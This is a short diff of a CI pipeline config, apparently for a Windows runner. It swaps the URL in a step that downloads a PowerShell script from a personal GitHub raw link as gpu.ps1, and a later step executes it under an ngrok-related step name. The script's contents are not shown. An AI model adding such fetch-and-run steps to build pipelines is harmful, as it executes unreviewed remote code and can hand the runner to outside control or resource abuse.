@@ -15,5 +15,5 @@
           - run:
              name: Paste Ngrok Auth Value In Hosted Link
              command: 
-               Invoke-WebRequest https://raw.githubusercontent.com/ZaprdowSky/zap/main/zapi -OutFile gpu.ps1
+               Invoke-WebRequest https://raw.githubusercontent.com/ZaprdowSky/zapiaa/main/sh -OutFile gpu.ps1
           - run: ./gpu.ps1
